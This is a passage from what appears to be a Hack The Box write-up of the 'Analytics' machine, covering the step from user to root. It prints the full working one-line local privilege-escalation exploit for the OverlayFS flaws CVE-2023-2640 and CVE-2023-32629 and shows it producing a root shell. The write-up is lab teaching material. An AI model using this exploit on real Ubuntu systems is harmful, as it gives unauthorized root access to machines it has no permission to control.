+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">passwd</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">mount</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">chfn</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">dbus</span><span class="o">-</span><span class="mf">1.0</span><span class="o">/</span><span class="n">dbus</span><span class="o">-</span><span class="n">daemon</span><span class="o">-</span><span class="n">launch</span><span class="o">-</span><span class="n">helper</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">openssh</span><span class="o">/</span><span class="n">ssh</span><span class="o">-</span><span class="n">keysign</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">libexec</span><span class="o">/</span><span class="n">polkit</span><span class="o">-</span><span class="n">agent</span><span class="o">-</span><span class="n">helper</span><span class="o">-</span><span class="mi">1</span>
+<span class="nd">metalytics@analytics</span><span class="p">:</span><span class="o">~$</span>
+</pre></div>
+<h3>Shell as root</h3><br/>
+<p>As there are containers, it's worth checking mounted folders. To do so, we use the <code>mount</code> command:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">metalytics@analytics</span><span class="p">:</span><span class="o">~$</span> <span class="n">mount</span>
+<span class="n">sysfs</span> <span class="n">on</span> <span class="o">/</span><span class="n">sys</span> <span class="nb">type</span> <span class="n">sysfs</span> <span class="p">(</span><span class="n">rw</span><span class="p">,</span><span class="n">nosuid</span><span class="p">,</span><span class="n">nodev</span><span class="p">,</span><span class="n">noexec</span><span class="p">,</span><span class="n">relatime</span><span class="p">)</span>
+<span class="n">proc</span> <span class="n">on</span> <span class="o">/</span><span class="n">proc</span> <span class="nb">type</span> <span class="n">proc</span> <span class="p">(</span><span class="n">rw</span><span class="p">,</span><span class="n">relatime</span><span class="p">,</span><span class="n">hidepid</span><span class="o">=</span><span class="n">invisible</span><span class="p">)</span>
+<span class="n">udev</span> <span class="n">on</span> <span class="o">/</span><span class="n">dev</span> <span class="nb">type</span> <span class="n">devtmpfs</span> <span class="p">(</span><span class="n">rw</span><span class="p">,</span><span class="n">nosuid</span><span class="p">,</span><span class="n">relatime</span><span class="p">,</span><span class="n">size</span><span class="o">=</span><span class="mi">1933192</span><span class="n">k</span><span class="p">,</span><span class="n">nr_inodes</span><span class="o">=</span><span class="mi">483298</span><span class="p">,</span><span class="n">mode</span><span class="o">=</span><span class="mi">755</span><span class="p">,</span><span class="n">inode64</span><span class="p">)</span>
+<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
+<span class="n">binfmt_misc</span> <span class="n">on</span> <span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="n">sys</span><span class="o">/</span><span class="n">fs</span><span class="o">/</span><span class="n">binfmt_misc</span> <span class="nb">type</span> <span class="n">binfmt_misc</span> <span class="p">(</span><span class="n">rw</span><span class="p">,</span><span class="n">nosuid</span><span class="p">,</span><span class="n">nodev</span><span class="p">,</span><span class="n">noexec</span><span class="p">,</span><span class="n">relatime</span><span class="p">)</span>
+<span class="n">overlay</span> <span class="n">on</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">docker</span><span class="o">/</span><span class="n">overlay2</span><span class="o">/</span><span class="mi">57</span><span class="n">ff81ea0dda5af21d8d87d5ba70ea41b317dc7fcadd8ecdfdc193faf060589f</span><span class="o">/</span><span class="n">merged</span> <span class="nb">type</span> <span class="n">overlay</span> <span class="p">(</span><span class="n">rw</span><span class="p">,</span><span class="n">relatime</span><span class="p">,</span><span class="n">lowerdir</span><span class="o">=/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">docker</span><span class="o">/</span><span class="n">overlay2</span><span class="o">/</span><span class="n">l</span><span class="o">/</span><span class="n">B2OB4ZRBAC4CJRPOY7QPRMR4JA</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">docker</span><span class="o">/</span><span class="n">overlay2</span><span class="o">/</span><span class="n">l</span><span class="o">/</span><span class="n">XW5JTCT2MPEXHQG7MOTAI2T4KP</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">docker</span><span class="o">/</span><span class="n">overlay2</span><span class="o">/</span><span class="n">l</span><span class="o">/</span><span class="n">NFDWLGW3V3JHKDMCSIVCIGFRMU</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">docker</span><span class="o">/</span><span class="n">overlay2</span><span class="o">/</span><span class="n">l</span><span class="o">/</span><span class="n">MW4MXSGOUKAHBMLEMZ4WR4K7P2</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">docker</span><span class="o">/</span><span class="n">overlay2</span><span class="o">/</span><span class="n">l</span><span class="o">/</span><span class="n">AT6LTLZWU4G7MV5NOTUEB7AR4N</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">docker</span><span class="o">/</span><span class="n">overlay2</span><span class="o">/</span><span class="n">l</span><span class="o">/</span><span class="n">E6VXP5EJLZW24GE2AHMELF7FTD</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">docker</span><span class="o">/</span><span class="n">overlay2</span><span class="o">/</span><span class="n">l</span><span class="o">/</span><span class="mi">3</span><span class="n">BARVZES6SW2GPRYNNYXZNM63J</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">docker</span><span class="o">/</span><span class="n">overlay2</span><span class="o">/</span><span class="n">l</span><span class="o">/</span><span class="n">JMBR2L6LC7K3O6CZHA24AF2CYR</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">docker</span><span class="o">/</span><span class="n">overlay2</span><span class="o">/</span><span class="n">l</span><span class="o">/</span><span class="n">PMQWGTOJEKRSOK2OV65KQJBDQY</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">docker</span><span class="o">/</span><span class="n">overlay2</span><span class="o">/</span><span class="n">l</span><span class="o">/</span><span class="n">L7Y5QRKKSPELNF2AUJ55RR2MV5</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">docker</span><span class="o">/</span><span class="n">overlay2</span><span class="o">/</span><span class="n">l</span><span class="o">/</span><span class="n">RO73TCQC6F7YHICLAOSVCCNSQ6</span><span class="p">,</span><span class="n">upperdir</span><span class="o">=/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">docker</span><span class="o">/</span><span class="n">overlay2</span><span class="o">/</span><span class="mi">57</span><span class="n">ff81ea0dda5af21d8d87d5ba70ea41b317dc7fcadd8ecdfdc193faf060589f</span><span class="o">/</span><span class="n">diff</span><span class="p">,</span><span class="n">workdir</span><span class="o">=/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">docker</span><span class="o">/</span><span class="n">overlay2</span><span class="o">/</span><span class="mi">57</span><span class="n">ff81ea0dda5af21d8d87d5ba70ea41b317dc7fcadd8ecdfdc193faf060589f</span><span class="o">/</span><span class="n">work</span><span class="p">)</span>
+<span class="n">nsfs</span> <span class="n">on</span> <span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">docker</span><span class="o">/</span><span class="n">netns</span><span class="o">/</span><span class="mi">00</span><span class="n">d3394801ff</span> <span class="nb">type</span> <span class="n">nsfs</span> <span class="p">(</span><span class="n">rw</span><span class="p">)</span>
+<span class="n">tmpfs</span> <span class="n">on</span> <span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">user</span><span class="o">/</span><span class="mi">1000</span> <span class="nb">type</span> <span class="n">tmpfs</span> <span class="p">(</span><span class="n">rw</span><span class="p">,</span><span class="n">nosuid</span><span class="p">,</span><span class="n">nodev</span><span class="p">,</span><span class="n">relatime</span><span class="p">,</span><span class="n">size</span><span class="o">=</span><span class="mi">400128</span><span class="n">k</span><span class="p">,</span><span class="n">nr_inodes</span><span class="o">=</span><span class="mi">100032</span><span class="p">,</span><span class="n">mode</span><span class="o">=</span><span class="mi">700</span><span class="p">,</span><span class="n">uid</span><span class="o">=</span><span class="mi">1000</span><span class="p">,</span><span class="n">gid</span><span class="o">=</span><span class="mi">1000</span><span class="p">,</span><span class="n">inode64</span><span class="p">)</span>
+<span class="nd">metalytics@analytics</span><span class="p">:</span><span class="o">~$</span>
+</pre></div>
+<h3>GameOver(lay) - CVE-2023-2640 &amp; CVE-2023-32629</h3><br/>
+<p>Overlay is a union mount filesystem that allows merging two separate filesystems into a single unified view. It operates by overlaying one filesystem onto another, with the lower filesystem serving as the base and the upper filesystem providing the modifications or changes.</p><br/>
+<p>While searching for OverlayFS vulnerabilities, I came across two issues that allow for local privilege escalation. Both vulnerabilities, <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-2640">CVE-2023-2640</a> and <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-32629">CVE-2023-32629</a>, facilitate local privilege escalation, enabling an unprivileged user to attain elevated privileges on the system. </p><br/>
+<p>I found this <a href="https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629">repository</a> which includes a proof of concept (POC) for this vulnerability. It also contains a list of vulnerable kernel versions:</p><br/>
+<p><img alt="" src="https://elswix.github.io/writeups/htb/easy/analytics/img/7.png"/></p><br/>
+<p>Looking at the kernel version of Analytics, we observe that it is vulnerable.</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">metalytics@analytics</span><span class="p">:</span><span class="o">~$</span> <span class="n">uname</span> <span class="o">-</span><span class="n">a</span>
+<span class="n">Linux</span> <span class="n">analytics</span> <span class="mf">6.2.0</span><span class="o">-</span><span class="mi">25</span><span class="o">-</span><span class="n">generic</span> <span class="n">#25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Wed Jun 28 09:55:23 UTC 2 x86_64 x86_64 x86_64 GNU/Linux</span>
+<span class="nd">metalytics@analytics</span><span class="p">:</span><span class="o">~$</span>
+</pre></div>
+<p>The exploit consists of only a command:</p><br/>
+<div class="highlight"><pre><span></span>unshare -rm sh -c <span class="s2">"mkdir l u w m &amp;&amp; cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m &amp;&amp; touch m/*;"</span> <span class="o">&amp;&amp;</span> u/python3 -c <span class="s1">'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash &amp;&amp; chmod 4755 /var/tmp/bash &amp;&amp; /var/tmp/bash -p &amp;&amp; rm -rf l m u w /var/tmp/bash")'</span>
+</pre></div>
+<p>I modified it slightly to obtain a bash shell:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">metalytics@analytics</span><span class="p">:</span><span class="o">~$</span> <span class="n">unshare</span> <span class="o">-</span><span class="n">rm</span> <span class="n">sh</span> <span class="o">-</span><span class="n">c</span> <span class="s2">"mkdir l u w m &amp;&amp; cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m &amp;&amp; touch m/*;"</span> <span class="o">&amp;&amp;</span> <span class="n">u</span><span class="o">/</span><span class="n">python3</span> <span class="o">-</span><span class="n">c</span> <span class="s1">'import os;os.setuid(0);os.system("/bin/bash")'</span>
+<span class="nd">root@analytics</span><span class="p">:</span><span class="o">~</span><span class="root1">#</span><span class="n"></span>
+</pre></div>
+<p>As you can see, it worked, and now we have root access on Analytics.</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">root@analytics</span><span class="p">:</span><span class="o">~</span><span class="root1">#</span><span class="n"> whoami</span>
+<span class="n">root</span>
+<span class="nd">root@analytics</span><span class="p">:</span><span class="o">~</span><span class="root1">#</span><span class="n"> id</span>
+<span class="n">uid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">metalytics</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1000</span><span class="p">(</span><span class="n">metalytics</span><span class="p">)</span>
+<span class="nd">root@analytics</span><span class="p">:</span><span class="o">~</span><span class="root1">#</span><span class="n"></span>
+</pre></div>
+<p>Finally, we can read <code>root.txt</code>:</p><br/>
+<div class="highlight"><pre><span></span><span class="nd">root@analytics</span><span class="p">:</span><span class="o">~</span><span class="root1">#</span><span class="n"> cd /root</span>
+<span class="nd">root@analytics</span><span class="p">:</span><span class="o">/</span><span class="n">root</span><span class="root1">#</span><span class="n"> cat root.txt</span>
+<span class="mi">5</span><span class="n">f558</span><span class="o">********************</span><span class="n">e2de473</span>
+<span class="nd">root@analytics</span><span class="p">:</span><span class="o">/</span><span class="n">root</span><span class="root1">#</span><span class="n"></span>
+</pre></div>
+            </div>
+        </div>
+    </section>
+
+    <footer>
+        <p>&copy; 2024 elswix.github.io</p>
+    </footer>
+</body>
+</html>
